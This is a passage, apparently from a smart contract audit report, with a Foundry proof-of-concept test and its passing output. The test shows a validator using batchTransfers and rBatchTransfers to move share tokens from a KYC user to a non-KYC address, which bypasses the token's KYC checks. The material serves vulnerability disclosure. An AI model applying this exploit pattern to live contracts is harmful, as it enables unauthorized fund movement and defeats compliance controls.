nKyc):\", postSenderBalance, postReceiverBalance);\n\n        assertEq(postSenderBalance, preSenderBalance - amounts[0], \"Validator drained sender without KYC check\");\n        assertEq(postReceiverBalance, preReceiverBalance + amounts[0], \"Non-KYC address received funds via batchTransfers\");\n    }\n\n    function testRBatchTransfersBypassesKYC() public {\n        // Phase 1: Fund the verified holder again so rBatchTransfers has spendable balance\n        uint256 seedAmount = 150e18;\n        vm.prank(owner);\n        uint256 mintedShares = vault.deposit(seedAmount, kycUser);\n        console.log(\"Minted shares to KYC user (rBatch path):\", mintedShares);\n\n        // Phase 2: Show the regular transfer still blocks the non-KYC destination\n        vm.startPrank(kycUser);\n        vm.expectRevert(WERC7575ShareToken.KycRequired.selector);\n        shareToken.transfer(nonKycUser, 40e18);\n        vm.stopPrank();\n\n        // Phase 3: Malicious validator moves the same amount via rBatchTransfers with zero rBalance flags\n        uint256 preSenderBalance = shareToken.balanceOf(kycUser);\n        uint256 preReceiverBalance = shareToken.balanceOf(nonKycUser);\n        console.log(\"Pre-rBatch balances (kyc, nonKyc):\", preSenderBalance, preReceiverBalance);\n\n        address[] memory debtors = new address[](1);\n        address[] memory creditors = new address[](1);\n        uint256[] memory amounts = new uint256[](1);\n        debtors[0] = kycUser;\n        creditors[0] = nonKycUser;\n        amounts[0] = 40e18;\n\n        // rBalanceFlags is zero here; no rBalance updates requested, yet transfer still succeeds without KYC\n        vm.prank(validator);\n        shareToken.rBatchTransfers(debtors, creditors, amounts, 0);\n\n        uint256 postSenderBalance = shareToken.balanceOf(kycUser);\n        uint256 postReceiverBalance = shareToken.balanceOf(nonKycUser);\n        console.log(\"Post-rBatch balances (kyc, nonKyc):\", postSenderBalance, postReceiverBalance);\n\n        assertEq(postSenderBalance, preSenderBalance - amounts[0], \"Validator drained sender via rBatchTransfers\");\n        assertEq(postReceiverBalance, preReceiverBalance + amounts[0], \"Non-KYC address received funds via rBatchTransfers\");\n        assertEq(shareToken.rBalanceOf(nonKycUser), 0, \"No rBalance bookkeeping restricts the non-KYC recipient\");\n    }\n}\n\n```\n\nRun\n```bash\nforge test --match-contract ValidatorBatchTransfersKYCBreach -vv\n```\n\nTest Results\n```bash\nRan 2 tests for test/ValidatorBatchTransfersKYCBypass.t.sol:ValidatorBatchTransfersKYCBreach\n[PASS] testBatchTransfersBypassesKYC() (gas: 176672)\nLogs:\n  Minted shares to KYC user: 200000000000000000000\n  Pre-batch balances (kyc, nonKyc): 200000000000000000000 0\n  Post-batch balances (kyc, nonKyc): 150000000000000000000 50000000000000000000\n\n[PASS] testRBatchTransfersBypassesKYC() (gas: 178508)\nLogs:\n  Minted shares to KYC user (rBatch path): 150000000000000000000\n  Pre-rBatch balances (kyc, nonKyc): 150000000000000000000 0\n  Post-rBatch balances (kyc, nonKyc): 110000000000000000000 40000000000000000000\n\nSuite result: ok. 2 passed; 0 failed; 0 skipped; finished in 14.08ms (5.17ms CPU time)\n```\n\nThe test logs pre/post balances and passes, confirming that validator batch operations bypass the KYC and pause protections enforced on normal user transfers.",
